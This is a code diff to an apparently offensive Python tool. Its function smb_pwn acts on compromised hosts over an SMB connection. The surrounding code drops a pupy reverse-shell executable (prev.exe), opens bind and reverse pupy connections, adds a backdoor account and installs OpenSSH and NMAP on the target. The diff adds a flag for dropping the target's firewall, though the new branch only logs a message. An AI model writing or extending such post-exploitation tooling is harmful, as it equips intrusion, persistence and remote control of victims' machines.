@@ -1058,6 +1058,11 @@ def smb_pwn(conn, arch):
             logging.info('No commands in file')
     else:
         logging.info('No commands.txt found!')
+
+    if args.nf:
+        server_os = conn.get_server_os()
+        logging.info('Dropping firewall for: %s' % server_os)
+        
     if args.nr:
         if os.path.isfile('prev.exe'):
             logging.info('pupy rev found, dropping')
@@ -1090,7 +1095,7 @@ def smb_pwn(conn, arch):
             logging.info('*'*40)
         else:
             logging.info('Openssh (./%s) not found' % OSSH_VER)
-            
+
         if os.path.isfile('%s' % NMAP_VER ):
             logging.info('NMAP installer found')
             if os.path.isfile('%s' % OSSH_VER):
@@ -1178,6 +1183,7 @@ parser.add_argument('-b', help='Add backdoor account',action='store_true', defau
 parser.add_argument('-s', help='Setup openssh/NMAP',action='store_true', default=False)
 parser.add_argument('-nr', help='Rev pupy connection',action='store_false', default=True)
 parser.add_argument('-nB', help='Bind pupy connection',action='store_false', default=True)
+parser.add_argument('-nf', help='Dont Drop firewall',action='store_false', default=True)
 parser.add_argument('-c', help='Command Shell *broken', action='store_true', default=False)
 args = parser.parse_args()
 
